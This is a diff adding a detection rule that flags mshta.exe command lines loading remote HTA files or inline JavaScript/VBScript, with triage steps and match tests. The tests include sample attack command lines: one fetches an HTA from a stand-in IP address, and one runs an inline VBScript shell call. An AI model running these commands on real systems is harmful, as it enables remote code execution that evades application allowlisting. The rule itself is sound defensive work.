@@ -1,0 +1,31 @@
+id: DL-0004
+title: mshta runs a remote HTA or inline script
+description: >
+  mshta.exe executes an HTA from a URL or inline JavaScript/VBScript. It is a signed
+  Microsoft binary, so it is a favourite way to run script while bypassing application
+  allowlisting.
+attack: [T1218.005]
+tactic: execution
+severity: high
+logsource: process_creation
+detection:
+  selection:
+    process.name: mshta.exe
+    process.command_line|contains: ['http://', 'https://', 'javascript:', 'vbscript:', 'about:']
+  condition: selection
+false_positives:
+  - Very old line-of-business apps built on HTA that load pages from an intranet server.
+triage:
+  - Retrieve the URL or inline script from the command line and analyse it in a sandbox.
+  - Check child processes and network connections of mshta.
+tests:
+  match:
+    - process.name: mshta.exe
+      process.command_line: 'mshta.exe https://198.51.100.7/update.hta'
+    - process.name: mshta.exe
+      process.command_line: 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""calc"":close")'
+  no_match:
+    - process.name: mshta.exe
+      process.command_line: 'mshta.exe C:\Program Files\Vendor\setup.hta'
+    - process.name: msedge.exe
+      process.command_line: 'msedge.exe https://example.org'
